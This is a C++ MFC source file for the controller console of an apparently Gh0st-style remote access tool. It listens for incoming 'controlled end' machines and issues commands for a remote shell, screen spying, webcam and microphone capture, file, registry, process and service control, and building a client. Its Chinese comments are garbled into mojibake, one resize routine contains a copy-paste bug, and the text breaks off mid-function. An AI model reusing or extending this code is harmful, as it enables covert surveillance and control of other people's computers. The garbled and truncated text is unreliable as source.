
// RemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "RemoteDlg.h"
#include "afxdialogex.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"
#include "SettingDlg.h"
#include "Common.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "ScreenSpyDlg.h"
#include "FloatWnd.h"
#include "VideoDlg.h"
#include "RegDlg.h"
#include "ServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif



typedef struct
{
	char*     szTitle;           //�б������
	int		  nWidth;            //�б�Ŀ��
}COLUMNSTRUCT;



COLUMNSTRUCT g_Column_Data_Online[] = 
{
	{"IP",			    148	},
	{"����",			150	},
	{"�������/��ע",	160	},
	{"����ϵͳ",		128	},
	{"CPU",			    80	},
	{"����ͷ",		    81	},
	{"PING",			81	}
};

int g_Column_Count_Online = 7; //�б�ĸ���
int g_Column_Online_Width = 0; 


COLUMNSTRUCT g_Column_Data_Message[] = 
{
	{"��Ϣ����",		80	},
	{"ʱ��",			100	},
	{"��Ϣ����",	    660	}
};

int g_Column_Count_Message = 3; //�б�ĸ���
int g_Column_Message_Width = 0; 




//״̬��ʹ�õ�����
static UINT indicators[] =
{
	IDR_STATUSBAR_STRING,
	
};


CIOCPServer *m_iocpServer   = NULL;  //IOCP���ȫ��ָ��
CRemoteDlg  *g_pPCRemoteDlg = NULL;  //���Ի����ȫ��ָ���� ���캯���н��и�ֵ

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
public:

	
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	
END_MESSAGE_MAP()


// CRemoteDlg �Ի���




CRemoteDlg::CRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CRemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	g_pPCRemoteDlg = this;
	iCount = 0;
}

void CRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CRemoteDlg::OnRclickOnline)
	ON_COMMAND(IDM_ONLINE_CMD, &CRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_SERVER, &CRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CRemoteDlg::OnOnlineRegister)
	ON_COMMAND(IDM_ONLINE_DELETE, &CRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_CLOSE, &CRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_ABOUT, &CRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_SET, &CRemoteDlg::OnMainSet)
	ON_COMMAND(IDM_MAIN_BUILD, &CRemoteDlg::OnMainBuild)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CRemoteDlg::OnNotifyShow)
	ON_COMMAND(IDM_NOTIFY_CLOSE, &CRemoteDlg::OnNotifyClose)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)  
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog) 
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_COMMAND(IDM_ONLINE_REGEDIT, &CRemoteDlg::OnOnlineRegedit)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)      
	ON_WM_CLOSE()
END_MESSAGE_MAP()



void CRemoteDlg::OnOnlineRegedit()
{
	// TODO: �ڴ���������������
    //MessageBox("ע������");

	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}



void CRemoteDlg::OnOnlineServer()
{
	// TODO: �ڴ���������������
	//MessageBox("�������");
	BYTE	bToken = COMMAND_SERVICES;         //��ֵһ���� Ȼ���͵�����ˣ������������COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));

}


// CRemoteDlg ��Ϣ�������

BOOL CRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	RECT  rect1;

	SystemParametersInfo(SPI_GETWORKAREA, 0, &rect1,0);


	rect1.bottom=48;
	rect1.left+=rect1.right-48;

	m_FloatWnd = new CFloatWnd;

	m_FloatWnd->Create(IDD_DIALOG_FLOAT,this);
	m_FloatWnd->MoveWindow(&rect1);  
	m_FloatWnd->ShowWindow(SW_SHOW);
		m_FloatWnd->OnUpdateTransparent(255);



	

	InitList();                    //�б���ʼ��
	CreatStatusBar();              //״̬������

	CreateToolBar();               //����������

	InitTray(&nid);                //ϵͳ����

	


	ShowMessage(true,"�����ʼ���ɹ�...");
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;               //�Ӷ��ٸ�������Ч��
	MoveWindow(rect);

	//Activate(2356,9999);         //�滻����ΪListenPort
	ListenPort();
	
	//TestOnline();               //���Դ���
	



	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //����˵���Դ
	::SetMenu(this->GetSafeHwnd(),hmenu);                  //Ϊ�������ò˵�
	::DrawMenuBar(this->GetSafeHwnd());                    //��ʾ�˵�


	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CRemoteDlg::OnSize(UINT nType, int cx, int cy)   //�����cx�ǶԻ�������ҵĳ��� cy�ǶԻ�����ϵ��µĳ���
{
	CDialogEx::OnSize(nType, cx, cy);


	if (SIZE_MINIMIZED==nType)
	{
		return;
	}

	if (m_CList_Online.m_hWnd!=NULL)   //���ؼ�Ҳ�Ǵ������Ҳ�о����
	{
		CRect rc;
		rc.left= 1;          //�б��������
		rc.top = 80;         //�б��������
		rc.right = cx-1;     //�б��������
		rc.bottom= cy-160;   //�б��������
		m_CList_Online.MoveWindow(rc);



		
		for(int i=0;i<g_Column_Count_Online;i++){           //����ÿһ����
			double Temp=g_Column_Data_Online[i].nWidth;     //�õ���ǰ�еĿ��
			Temp/=g_Column_Online_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp*=cx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth=Temp;                                 //ת��Ϊint ����
			m_CList_Online.SetColumnWidth(i,(lenth));       //���õ�ǰ�Ŀ��
		}
	}
	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;        //�б��������
		rc.top = cy-156;    //�б��������
		rc.right  = cx-1;   //�б��������
		rc.bottom = cy-20;  //�б��������
		m_CList_Message.MoveWindow(rc);

		for(int i=0;i<g_Column_Count_Message;i++){           //����ÿһ����
			double Temp=g_Column_Data_Message[i].nWidth;     //�õ���ǰ�еĿ��
			Temp/=g_Column_Message_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp*=cx;                                        //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth=Temp;                                  //ת��Ϊint ����
			m_CList_Online.SetColumnWidth(i,(lenth));        //���õ�ǰ�Ŀ��
		}
	}

	//״̬������
	if(m_wndStatusBar.m_hWnd!=NULL){    //���Ի����С�ı�ʱ ״̬����СҲ��֮�ı�
		CRect rc;
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	//����������
	if(m_ToolBar.m_hWnd!=NULL)                  //������
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //���ù�������Сλ��
	}
}


// ��ʼ����Ա����
int CRemoteDlg::InitList(void)
{

	for (int i = 0; i < g_Column_Count_Online; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth;  
	}


	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);

		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}


	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	return 0;
}


void CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext)
{
	m_CList_Online.InsertItem(0,strIP);                                
	m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      
	m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); 
	m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); 
	m_CList_Online.SetItemData(0,(DWORD)pContext);

	ShowMessage(true,strIP+"��������");
}




void CRemoteDlg::ShowMessage(bool bOk, CString strMsg)
{
	CString strIsOK,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOK="ִ�гɹ�";
	}else{
		strIsOK="ִ��ʧ��";
	}
	m_CList_Message.InsertItem(0,strIsOK);
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);



	CString strStatusMsg;
	if (strMsg.Find("����")>0)         //�������߻���������Ϣ
	{
		iCount++;
	}else if (strMsg.Find("����")>0)
	{
		iCount--;
	}else if (strMsg.Find("�Ͽ�")>0)
	{
		iCount--;
	}
	iCount=(iCount<=0?0:iCount);         //��ֹiCount ��-1�����
	strStatusMsg.Format("��%d����������",iCount);
	m_wndStatusBar.SetPaneText(0,strStatusMsg);   //��״̬������ʾ����


}


//����OnLine
void CRemoteDlg::TestOnline(void)
{
	//AddList("192.168.0.1","����������","Shine","Windows7","2.2GHZ","��","1000");
	//AddList("192.168.0.2","����������","Shine","Windows7","2.2GHZ","��","1000");
	//AddList("192.168.0.3","����������","Shine","Windows7","2.2GHZ","��","1000");
	
}

void CRemoteDlg::OnRclickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������


	CMenu	popup;
	popup.LoadMenu(IDR_MENU_LIST_ONLINE);             //���ز˵���Դ
	CMenu*	pM = popup.GetSubMenu(0);                 //��ò˵�������
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)       //���û��ѡ��
	{ 
		for (int i = 0;i<count;i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CRemoteDlg::OnOnlineCmd()
{
	// TODO: �ڴ���������������
	//MessageBox("�ն˹���");

	BYTE	bToken = COMMAND_SHELL;             //�򱻿ض˷���һ��COMMAND_SHELL����
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CRemoteDlg::OnOnlineProcess()
{
	// TODO: �ڴ���������������
	//MessageBox("���̹���");

	BYTE	bToken = COMMAND_SYSTEM;           //�򱻿ض˷���һ��COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineWindow()
{
	// TODO: �ڴ���������������
	//MessageBox("���ڹ���");

	BYTE	bToken = COMMAND_WSLIST;         
	SendSelectCommand(&bToken, sizeof(BYTE));

}


void CRemoteDlg::OnOnlineDesktop()
{
	// TODO: �ڴ���������������
	//MessageBox("�������");
	BYTE	bToken = COMMAND_SCREEN_SPY;  //�򱻿ض˷���COMMAND_SCREEN_SPY
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineFile()
{
	// TODO: �ڴ���������������
	//MessageBox("�ļ�����");

	BYTE	bToken = COMMAND_LIST_DRIVE;            //�򱻿ض˷�����ϢCOMMAND_LIST_DRIVE �ڱ��ض�������COMMAND_LIST_DRIVE   TOKEN_DRIVE_LIST
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineAudio()
{
	// TODO: �ڴ���������������
	//MessageBox("��Ƶ����");

	BYTE	bToken = COMMAND_AUDIO;                 //�򱻿ض˷�������
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CRemoteDlg::OnOnlineVideo()
{
	// TODO: �ڴ���������������
	//MessageBox("��Ƶ����");



	BYTE	bToken = COMMAND_WEBCAM;                 //�򱻿ض˷�������
	SendSelectCommand(&bToken, sizeof(BYTE));	
}




void CRemoteDlg::OnOnlineRegister()
{
	// TODO: �ڴ���������������

	MessageBox("ע������");
}


void CRemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������

	CString strIP;
	int iSelect = m_CList_Online.GetSelectionMark( );                   //���ѡ���������
	strIP = m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);          //ͨ��ѡ���е������������0���IP
	m_CList_Online.DeleteItem(iSelect);                                 //ɾ������
	strIP+="�Ͽ�����";
	ShowMessage(true,strIP);                                            //��MessageList�ؼ���Ͷ����Ϣ
}


void CRemoteDlg::OnMainClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE);
}


void CRemoteDlg::OnMainAbout()
{
	// TODO: �ڴ���������������
	//����ϵͳ��About�Ի���

	CAboutDlg dlgAbout;
	dlgAbout.DoModal();    //���Ǵ���һ���Ի���ķ���
}


void CRemoteDlg::OnMainSet()
{
	// TODO: �ڴ���������������
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}


void CRemoteDlg::OnMainBuild()
{
	// TODO: �ڴ���������������
	MessageBox("���������");
}

//����״̬��
void CRemoteDlg::CreatStatusBar(void)
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))                    //����״̬���������ַ���Դ��ID
	{
		return ;      
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);             
	m_wndStatusBar.MoveWindow(rc);  
}


//��ʼ��������
void CRemoteDlg::CreateToolBar(void)
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //����һ��������  ������Դ
	{
	
		return;     
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //�����ǵ�λͼ��Դ�����
	RECT rt,rtMain;
	GetWindowRect(&rtMain);   //�õ��������ڵĴ�С
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);

	m_ToolBar.SetButtonText(0,"�ն˹���");     //��λͼ����������ļ�
	m_ToolBar.SetButtonText(1,"���̹���"); 
	m_ToolBar.SetButtonText(2,"���ڹ���"); 
	m_ToolBar.SetButtonText(3,"�������"); 
	m_ToolBar.SetButtonText(4,"�ļ�����"); 
	m_ToolBar.SetButtonText(5,"��������"); 
	m_ToolBar.SetButtonText(6,"��Ƶ����"); 
	m_ToolBar.SetButtonText(7,"�������"); 
	m_ToolBar.SetButtonText(8,"ע������"); 
	m_ToolBar.SetButtonText(9,"��������"); 
	m_ToolBar.SetButtonText(10,"���ɷ����"); 
	m_ToolBar.SetButtonText(11,"����"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //��ʾ
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////ϵͳ����
void CRemoteDlg::InitTray(PNOTIFYICONDATA nid)
{
	nid->cbSize = sizeof(NOTIFYICONDATA);     //��С��ֵ
	nid->hWnd = m_hWnd;           //������
	nid->uID = IDR_MAINFRAME;     //icon  ID
	nid->uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //������ӵ�е�״̬
	nid->uCallbackMessage = UM_ICONNOTIFY;              //�ص���Ϣ
	nid->hIcon = m_hIcon;                               //icon ����
	CString str="RemoteԶ��Э�����.........";       //������ʾ
	lstrcpyn(nid->szTip, (LPCSTR)str, sizeof(nid->szTip) / sizeof(nid->szTip[0]));
	Shell_NotifyIcon(NIM_ADD, nid);   //��ʾ����

}

void CRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: 
	case WM_LBUTTONDBLCLK: 
		if (!IsWindowVisible()) 
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: 
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
			point.x, point.y, this, NULL); 
		//PostMessage(WM_USER, 0, 0);
		break;
	}
}



void CRemoteDlg::OnNotifyShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}


void CRemoteDlg::OnNotifyClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE);
}


void CRemoteDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	Shell_NotifyIcon(NIM_DELETE, &nid);
	CDialogEx::OnClose();
}


void CRemoteDlg::Activate(UINT uPort, UINT uMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)           //�����������Լ�������IOCP�� ��������Զ�̿��Ƶ�ͨ��ģ��
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;        //��̬�������ǵ������

	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, uPort))   //�����NotifyProc���׻��ֵĴ�����  100000 �����ǵ��������   uPort ��ͨ�ŵĶ˿�
	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}
		str.Format("�����˿�: %d�ɹ�", uPort);
		ShowMessage(true,str);
	}

	else
	{
		
		str.Format("�����˿�: %dʧ��", uPort);
		ShowMessage(false,str);
	}


}


void CRemoteDlg::ListenPort(void)
{
	int	nPort = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //��ȡini �ļ��еļ����˿�
	int	nMaxConnection = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //��ȡ���������
	if (nPort == 0)
	{
		nPort = 2356;                 //����ļ���û�����ݾ�����Ĭ������
	}
	if (nMaxConnection == 0)
	{
		nMaxConnection = 10000;
	}
	Activate(nPort,nMaxConnection);             //��ʼ����
}



void CALLBACK CRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{

	//::MessageBox(NULL,"�����ӵ���!!","",NULL);   //���Դ���

	try
	{

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			break;
		case NC_RECEIVE_COMPLETE:
			{
				ProcessReceiveComplete(pContext); //����ʱ��ȫ���� ��������������
				break;
			}
		}
	}catch(...){}
}

//
void CRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)  //GetQueue    ProcessIOMessage  Work
{
	if (pContext == NULL)
		return;


	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];    //0 Key  1  DlgHandle

	if (pContext->m_Dialog[0] > 0)                //����鿴�Ƿ������ֵ�ˣ������ֵ�˾Ͱ����ݴ������ܴ��ڴ���
	{
		switch (pContext->m_Dialog[0])
		{
		case SHELL_DLG:
			{
				((CShellDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case SYSTEM_DLG:
			{
				((CSystemDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case FILEMANAGER_DLG:
			{
				((CFileManagerDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case AUDIO_DLG:
			{
				((CAudioDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case SCREENSPY_DLG:
			{
				((CScreenSpyDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case WEBCAM_DLG:
			{
				((CVideoDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case REGEDIT_DLG:
			{
				((CRegDlg *)dlg)->OnReceiveComplete();
				break;
			}
		
		case SERVER_DLG:
			{
				((CServerDlg *)dlg)->OnReceiveComplete();
				break;

			}
		
		default:
			break;
		}

		return;
	}


	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])    
	{                                                           
	case TOKEN_LOGIN: // ���߰�

		{
			//���ﴦ������
			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);      //�򴰿�Ͷ���û����ߵ���Ϣ 
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));           //�򱻿ض˷���Ӧ������


			break;
		}
	case TOKEN_SHELL_START:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
			break;

		}
	case TOKEN_WSLIST:
	case TOKEN_PSLIST:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);      //�򿪽���ö�ٵĶԻ���
			break;
		}
	case TOKEN_DRIVE_LIST:																//�������б�
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
			break;
		}
	case TOKEN_BITMAPINFO:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);  //Զ������
			break;
		}	
	case TOKEN_AUDIO_START:	
		{																			   //Զ������
			g_pPCRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
			break;
		}

	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
			break;
		}

	case TOKEN_REGEDIT:            //ע���
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
			break;
		}
	case  TOKEN_SERVERLIST:       //����
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
			break;
		}
	
	
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}


LRESULT CRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)    //����һ�����ض���������Ҫ���õ������ݰ����������б���
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext	*pContext = (ClientContext *)lParam;         //ע�������  ClientContext  ���Ƿ�������ʱ���б���ȡ��������

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
	
		// ���Ϸ������ݰ�
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();



		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
		//IP
		strIP=IPAddress;

		//��������
		strPCName=LoginInfo->HostName;
		//ϵͳ
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Vista";  
